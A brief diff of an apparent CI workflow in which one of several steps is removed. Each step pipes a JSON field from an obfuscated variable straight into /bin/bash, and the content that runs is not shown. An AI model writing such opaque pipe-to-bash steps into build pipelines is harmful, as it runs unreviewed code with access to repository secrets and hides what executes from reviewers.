@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$eb73921" | jq -r .ng2 | /bin/bash
           printf '%s' "$l5" | jq -r .y4 | /bin/bash
           echo $hj917 | jq -r .xvtva17 | /bin/bash
-          printf '%s' "$wirls10960" | jq -r .sx538 | /bin/bash
           printf '%s' "$oz79217" | jq -r .c3945 | /bin/bash
 
       - name: Upload archive
